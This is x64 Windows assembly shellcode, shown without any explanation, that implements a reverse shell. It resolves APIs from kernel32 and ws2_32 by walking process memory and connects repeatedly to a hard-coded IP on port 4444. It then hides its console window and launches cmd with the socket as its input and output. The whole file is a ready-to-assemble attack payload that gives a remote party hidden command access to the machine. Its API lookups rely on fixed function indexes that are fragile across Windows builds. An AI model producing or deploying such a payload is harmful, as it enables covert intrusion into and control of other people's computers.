section .text
	global s
s:

xor rdx,rdx
mov rax,[gs:rdx+0x60]
mov rsi,[rax+0x18]
mov rsi,[rsi+0x10]
lodsq
mov rsi,[rax]
mov rdi,[rsi+0x30]

;--------------------------------
mov dl,0x88
mov ebx,[rdi+0x3c]
add rbx,rdi
mov ebx,[rbx+rdx]
add rbx,rdi ;IMAGE_EXPORT_DIRECTORY


mov r14d,[rbx+0x1c]
add r14,rdi ;kernel32.dll AddressOfFunctions


;-----------------------
;loading ws2_32.dll

mov dx,831*4
mov ebx,[r14+rdx]
add rbx,rdi ;LoadLibraryA()

xor rdx,rdx
push rdx
push rdx

mov [rsp],dword 'ws2_'
mov [rsp+4],dword '32.d'
mov [rsp+8],word 'll'


lea rcx,[rsp]

sub rsp,88

call rbx

add rsp,104

mov rsi,rax ;ws2_32.dll base address
;--------------------------------------
xor rbx,rbx
xor rdx,rdx

;finding Export table of ws2_32.dll

mov dl,0x88
mov ebx,[rsi+0x3c]
add rbx,rsi
mov ebx,[rbx+rdx]
add rbx,rsi ;IMAGE_EXPORT_DIRECTORY


mov r15d,[rbx+0x1c]
add r15,rsi ;ws2_32.dll AddressOfFunctions


;--------------------------------------

;WSAStartup(514,&WSADATA)

xor rdx,rdx
mov dx,114*4
mov ebx,[r15+rdx]
add rbx,rsi ;rbx=WSAStartup()


mov dx,408

sub rsp,rdx
lea rdx,[rsp]
xor rcx,rcx
mov cx,514

sub rsp,88 ;reserving space for API call (Important)

call rbx

;-------------------------------------------------------
;WSASocketA(2,1,6,0,0,0)

xor rdx,rdx
sub rsp,88

mov [rsp+32],rdx
mov [rsp+40],rdx


inc rdx
mov rcx,rdx
inc rcx

xor r8,r8
add r8,6

xor r9,r9

mov r9w,98*4
mov ebx,[r15+r9]
add rbx,rsi ;rbx=WSASocketA()

xor r9,r9
call rbx

mov r13,rax ;r13=SOCKET

;------------------------------------------
xor r8,r8
push r8
push r8

mov [rsp],byte 2
mov [rsp+2],word 0x5c11 ;port 4444
mov [rsp+4],dword 0x800aa8c0 ;change it
lea r12,[rsp]
sub rsp,88
;-------------------------------------------
;connect(SOCKET,(struct sockaddr *)&struct sockaddr_in,16)
c:
xor rbx,rbx
mov ebx,[r15+12]
add rbx,rsi ;rbx=connect()



mov rdx,r12
mov rcx,r13
mov r8b,16



call rbx
xor r8,r8
cmp rax,r8
jnz c

;----------------------------------------------------------------------------------------
;Hiding Window
;----------------------------------------------------------------------------------------

;AllocConsole()
xor rbx,rbx
mov ebx,[r14+64]
add rbx,rdi ;rbx=AllocConsole()

call rbx
;------------------------------
;loading user32.dll

xor rdx,rdx
push rdx
push rdx
mov [rsp],dword 'user'
mov [rsp+4],dword '32.d'
mov [rsp+8],word 'll'
lea rcx,[rsp]

mov dx,831*4
mov ebx,[r14+rdx]
add rbx,rdi
sub rsp,88

call rbx

mov rsi,rax
;--------------------------------

xor rbx,rbx
xor rdx,rdx

;----------------------------------
;FindWindowA("ConsoleWindowClass",NULL)

mov dx,586 
mov r12d,[r14+rdx*4]
add r12,rdi ;rbx=GetProcAddress()

xor rcx,rcx
push rcx
push rcx
mov [rsp],dword 'Find'
mov [rsp+4],dword 'Wind'
mov [rsp+8],dword 'owAA'
xor byte [rsp+11],0x41

lea rdx,[rsp]
mov rcx,rsi

sub rsp,88
call r12



;-----------------------------------
xor rdx,rdx
push rdx
push rdx
push rdx

mov [rsp],dword 'Cons'
mov [rsp+4],dword 'oleW'
mov [rsp+8],dword 'indo'
mov [rsp+12],dword 'wCla'
mov [rsp+16],word 'ss'

lea rcx,[rsp]

sub rsp,88

call rax

mov r15,rax
xor rdx,rdx
;---------------------------------------
;ShowWindow(HWND,0)

xor rcx,rcx
push rcx
push rcx
mov [rsp],dword 'Show'
mov [rsp+4],dword 'Wind'
mov [rsp+8],word 'ow'

lea rdx,[rsp]
mov rcx,rsi

sub rsp,88
call r12


mov rcx,r15
xor rdx,rdx
sub rsp,88
call rax

;-----------------------------------------------

;--------------------------------------------------------------------------------------------------------------------------------
;CreateProcessA()
mov dx,164*4
mov ebx,[r14+rdx]
add rbx,rdi


;STARTUPINFOA+PROCESS_INFORMATION
;----------------------------------
sub rsp,104
sub rsp,24
lea r12,[rsp]

mov dl,104

xor rcx,rcx
mov [r12],dword edx
mov [r12+4],rcx
mov [r12+12],rcx
mov [r12+20],rcx
mov [r12+24],rcx

xor rdx,rdx
mov dl,255
inc rdx

mov [r12+0x3c],edx
mov [r12+0x50],r13
mov [r12+0x58],r13
mov [r12+0x60],r13

;--------------------------------------------------

push 'cmdA'
mov [rsp+3],byte dl

lea rdx,[rsp]

inc rcx
;-------------------------------------
sub rsp,88

mov [rsp+32],rcx
xor rcx,rcx

xor r8,r8

mov [rsp+40],r8
mov [rsp+48],r8
mov [rsp+56],r8
lea r9,[r12]
mov [rsp+64],r9
lea r9,[r12+104]
mov [rsp+72],r9

xor r9,r9

call rbx

;-------------------------------

xor rdx,rdx
mov dx,296*4
mov ebx,[r14+rdx]
add rbx,rdi

xor rcx,rcx
call rbx


